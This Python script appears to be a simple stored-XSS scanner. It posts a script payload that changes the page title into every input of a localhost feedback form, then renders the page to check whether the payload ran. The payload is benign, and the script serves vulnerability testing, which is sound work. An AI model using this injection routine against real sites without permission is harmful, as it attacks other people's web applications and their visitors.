from requests_html import HTMLSession # https://requests.readthedocs.io/projects/requests-html/en/latest/
from bs4 import BeautifulSoup # https://www.crummy.com/software/BeautifulSoup/bs4/doc/

def main():
    session = HTMLSession() # Initilise base HTML session
    render_session = HTMLSession() # Initilise renderer HTML session

    page = session.get('http://localhost:5000/feedback') # Get content of public feedback page
    soup = BeautifulSoup(page.content, "lxml") # Parse content with beautiful soup as lxml
    print(soup) # Print parsed data
    payload = {} # define payload dict
    search = [(element['name']) for element in soup.find_all('input', attrs={'name': True})] # Search for elements with name 'input' in soup output [10]
    print(search) # print search output
    for x in search: # Iterate for every input found in search
        payload.update({x : "<script>document.title = 'XSS Vulnerable' </script>"}) # Create with input name and payload script to change the document title
    r = session.post('http://localhost:5000/feedback',payload) # Post payload to client
    print("Payload sent")
    render_page = render_session.get('http://localhost:5000/feedback') # Get updated content of public feedback page
    render_page.html.render() # Background render html page in python
    html = render_page.html.html # load rendered html into variable
    render_soup = BeautifulSoup(html, "lxml") # Parse content with beautiful soup as lxml
    title = render_soup.title.string # Extract current title of rendered document
    print(title)
    if title == "XSS Vulnerable": # If title is as set in the payload display message
        print("The scanned page is vulnerable to XSS")

main()
